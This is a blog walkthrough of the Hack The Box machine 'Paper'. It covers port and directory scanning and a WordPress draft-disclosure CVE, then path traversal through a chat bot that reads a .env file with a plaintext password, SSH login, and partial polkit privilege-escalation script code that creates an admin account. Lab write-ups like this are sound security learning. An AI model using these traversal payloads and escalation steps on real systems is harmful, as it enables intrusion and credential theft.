---
layout: post
title: CTF Paper
date:   2022-02-05 21:07:56 -0600
categories: CTF
tags: Linux
---


# /etc/hosts

```sh
echo "10.129.147.140 paper.htb" >> /etc/hosts
```
# rustscan

```sh
rustscan -a paper.htb  --range 1-65000


PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack
```

# nmap

```sh
nmap -sV -p 80,443,22 paper.htb

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
```
Apache outdated.

# Directory listing

```sh
wfuzz --sc 200 -w Documents/wordlist/directory-list-2.3-medium.txt http://paper.htb/FUZZ
```
Nothing
# sub domain listing

```sh
wfuzz -c -f sub-fighter -w Documents/wordlist/subdomains.lst -u 'http://paper.htb' -H "Host: FUZZ.paper.htb" --sc 200
```
Nothing

# Web
![](https://i.imgur.com/Bcky2gD.png)
Nothing in the source code.
Powered by centOS and apache

## php
This is good, maybe I can read php files in this server
![](https://i.imgur.com/Vq6XD2z.png)

# nmap 

# gobuster

```sh
gobuster dir -t 100 -x php -u http://paper.htb -w Documents/wordlist/directory-list-medium.txt
```
/manual               (Status: 301) [Size: 232] [--> http://paper.htb/manual/]
```sh
gobuster dir -t 100 -x php -u http://paper.htb/manual -w Documents/wordlist/directory-list-medium.txt
```
/misc                 (Status: 301) [Size: 237] [--> http://paper.htb/manual/misc/]
/images               (Status: 301) [Size: 239] [--> http://paper.htb/manual/images/]
/faq                  (Status: 301) [Size: 236] [--> http://paper.htb/manual/faq/]   
/programs             (Status: 301) [Size: 241] [--> http://paper.htb/manual/programs/]
/howto                (Status: 301) [Size: 238] [--> http://paper.htb/manual/howto/]   
/developer            (Status: 301) [Size: 242] [--> http://paper.htb/manual/developer/]
/style                (Status: 301) [Size: 238] [--> http://paper.htb/manual/style/]    
/ssl                  (Status: 301) [Size: 236] [--> http://paper.htb/manual/ssl/]      
/platform             (Status: 301) [Size: 241] [--> http://paper.htb/manual/platform/] 
/mod                  (Status: 301) [Size: 236] [--> http://paper.htb/manual/mod/]      
/LICENSE              (Status: 200) [Size: 11358]                                       
/vhosts               (Status: 301) [Size: 239] [--> http://paper.htb/manual/vhosts/]   
/rewrite              (Status: 301) [Size: 240] [--> http://paper.htb/manual/rewrite/]  
/BUILDING             (Status: 200) [Size: 102]        

Nothing interesting



# telnet 

```sh
telnet paper.htb 80
```
Trying 10.129.147.140...
Connected to paper.htb.
Escape character is '^]'.
GET /../../../../../../../../../../../../../../../../../../../etc/apache2/apach2.conf HTTP/1.1

HTTP/1.1 400 Bad Request
Date: Sat, 05 Feb 2022 21:39:40 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Content-Length: 226
Connection: close
Content-Type: text/html; charset=iso-8859-1


So we have office.paper, I'm gonna add it to my /etc/hosts
![](https://i.imgur.com/Q5kM1uF.png)

Yesss!!!!!

# gobuster

```sh
gobuster dir -t 100 -u http://office.paper -w Documents/wordlist/directory-list-medium.txt 
```
/wp-content           (Status: 301) [Size: 239] [--> http://office.paper/wp-content/]
/manual               (Status: 301) [Size: 235] [--> http://office.paper/manual/]    
/wp-includes          (Status: 301) [Size: 240] [--> http://office.paper/wp-includes/]
/wp-admin             (Status: 301) [Size: 237] [--> http://office.paper/wp-admin/]   

It will be easy, it's a workpress weebsite.

And we have some potentiel user: 
prisonmike
Jan
Michael
Nick

![](https://i.imgur.com/1Hg2dYT.png)
There is only one WP user.
![](https://i.imgur.com/KMOEUmC.png)


# wpscan

```sh
wpscan -e u vp vt dbe --url http://office.paper
```
The readme still here: http://office.paper/readme.html
WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&page=1
We have 2  wp users:
![](https://i.imgur.com/XGVq7Ea.png)
nick and prisonmike


# WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
https://wpscan.com/vulnerability/9909
Proof of Concept for "Wordpress <=5.2.3: viewing unauthenticated posts" (CVE-2019-17671)
https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/

![](https://i.imgur.com/h5IKW6U.png)
http://office.paper/?static=1
```
test
Micheal please remove the secret from drafts for gods sake!
Hello employees of Blunder Tiffin,
Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
So, I kindly request you all to take your discussions from the public blog to a more private chat system.
-Nick
# Warning for Michael
Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
Threat Level Midnight
A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT
[INT:DAY]
Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
# Secret Registration URL of new Employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY
# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
# Also, stop looking at my drafts. Jeez!
```
I have an another link, I have to add chat.office.paper to my hosts file.
http://chat.office.paper/register/8qozr226AhkCHZdyY

![](https://i.imgur.com/W4y6shA.png)

# rocket chat
This CTF is so fun :D
NOOO, GOD! NO, GOD, PLEASE, NO! NO! NO!
![](https://i.imgur.com/yAWGgNN.png)
I have something to do with the bot.
![](https://i.imgur.com/okXOupZ.png)

I can't upload files in the chat with the bot.
![](https://i.imgur.com/JfzMvu1.png)
This is interesting.
```sh
recyclops list sale
```
-rw-r--r-- 1 dwight dwight 158 Sep 15 13:03 portfolio.txt
![](https://i.imgur.com/Lel2Lam.png)
```sh
recyclops list ../../../home/
```
total 0
drwxr-xr-x. 3 root root 20 Jan 14 06:50 .
dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..
drwx------ 11 dwight dwight 294 Feb 5 14:46 dwight

Maybe I can start an another command with ;
Ahahahah!!!!
Stop injecting OS commands!

Maybe I can fetch the wp-config.php
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'

![](https://i.imgur.com/dgD3w1p.png)
![](https://i.imgur.com/nGttbhu.png)


# Get user
recyclops file ../../../home/dwight/hubot/.env
export ROCKETCHAT_PASSWORD=Queenofblad3s!23

I have to try this password with the user of the box.
recyclops list ../../../home/
total 8
drwxr-xr-x. 3 root root 20 Jan 14 06:50 .
dr-xr-xr-x. 17 root root 244 Jan 17 11:37 ..
drwx------ 13 dwight dwight 4096 Feb 6 04:10 dwight
```sh
ssh dwight@paper.htb
```

# get root
In the dwight home we have a pk.sh file.
```sh
#!/bin/bash

# Set the name and display name
userName="hacked"
realName="hacked"

# Set the account as an administrator
accountType=1

# Set the password hash for 'password' and password hint
password='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'
passHint="password"

# Check Polkit version
polkitVersion=$(systemctl status polkit.service | grep version | cut -d " " -f 9)
if [[ "$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)" -ge 1 || "$(yum list installed | grep polkit | grep -c 0.117-2)" ]]; then
    echo "[*] Vulnerable version of polkit found"
else
    echo "[!] WARNING: Version of polkit might not vulnerable"
fi
```

It will create a new user, hacked:password.
He is checking the version of polkit too.
I don't put all the code, it's too long, you have to see it yourself.
```sh
./pk.sh
```
Oh!!! pk is for polkit I got it now, but I don't know why my pol.py don't work, I'm using this exploit too. 
![](https://i.imgur.com/Wd0C6Wz.png)

It was a cool box, I was a bit stuck at the beginning because I didn't saw office.paper.htb
The bot was fun, you can do it in some python or bash bots on discord or IRC.

